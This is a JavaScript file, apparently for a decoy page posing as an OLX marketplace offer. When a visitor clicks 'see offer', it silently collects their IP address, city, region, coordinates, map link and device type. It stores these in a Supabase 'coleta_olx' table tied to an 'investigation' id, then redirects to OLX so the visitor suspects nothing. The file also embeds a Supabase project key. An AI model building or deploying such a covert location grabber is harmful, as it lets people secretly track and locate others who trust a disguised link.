// Conexão com o Supabase
const SUPABASE_URL = "https://dpfqhkjnirudtxuivhcg.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwZnFoa2puaXJ1ZHR4dWl2aGNnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTMwMDg1ODYsImV4cCI6MjA2ODU4NDU4Nn0.5NrF4nArELAGAkwjLOQNCdq-p1TLUIhZRN4XtZiJ7DI";

// Inicializa o cliente Supabase corretamente
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("btn-ver-oferta");

    btn.addEventListener("click", async () => {
        try {
            // Extrai o ID da URL
            const urlParams = new URLSearchParams(window.location.search);
            const investigacaoId = urlParams.get('id');

            if (!investigacaoId) {
                console.error("ID da investigação não encontrado na URL");
                window.location.href = "https://www.olx.com.br";
                return;
            }

            // Coleta IP do visitante
            const ipRes = await fetch("https://ipwho.is/");
            const ipData = await ipRes.json();
            const ip = ipData.ip;
            const geolocalizacao = `${ipData.city} - ${ipData.region}`;
            const latitude = ipData.latitude?.toString() || "0.0000";
            const longitude = ipData.longitude?.toString() || "0.0000";
            const mapa_link = `https://maps.google.com/maps?q=${latitude},${longitude}&z=14&output=embed`;

            // Detecta tipo de aparelho
            const userAgent = navigator.userAgent;
            let aparelho = "Desconhecido";
            if (/Mobi|Android/i.test(userAgent)) {
                aparelho = "Celular";
            } else if (/iPad|Tablet/i.test(userAgent)) {
                aparelho = "Tablet";
            } else {
                aparelho = "Computador";
            }

            // Busca a investigação atual
            const { data: investigacao } = await supabaseClient
                .from("coleta_olx")
                .select("redirecionamento, acessos")
                .eq("id", investigacaoId)
                .single();

            if (!investigacao) {
                console.error("Investigação não encontrada");
                window.location.href = "https://www.olx.com.br";
                return;
            }

            // Atualiza os dados da investigação
            const { error } = await supabaseClient
                .from("coleta_olx")
                .update({
                    ip: ip,
                    navegador: userAgent,
                    geolocalizacao,
                    aparelho: aparelho,
                    data_hora: new Date().toISOString(),
                    latitude,
                    longitude,
                    mapa_link,
                    acessos: (investigacao.acessos || 0) + 1
                })
                .eq("id", investigacaoId);

            if (error) {
                console.error("Erro ao atualizar no Supabase:", error);
            } else {
                console.log("Dados coletados com sucesso");
            }

            // Redireciona para o link configurado ou OLX por padrão
            window.location.href = investigacao.redirecionamento || "https://www.olx.com.br";

        } catch (err) {
            console.error("Erro geral na coleta:", err);
            window.location.href = "https://www.olx.com.br";
        }
    });
});
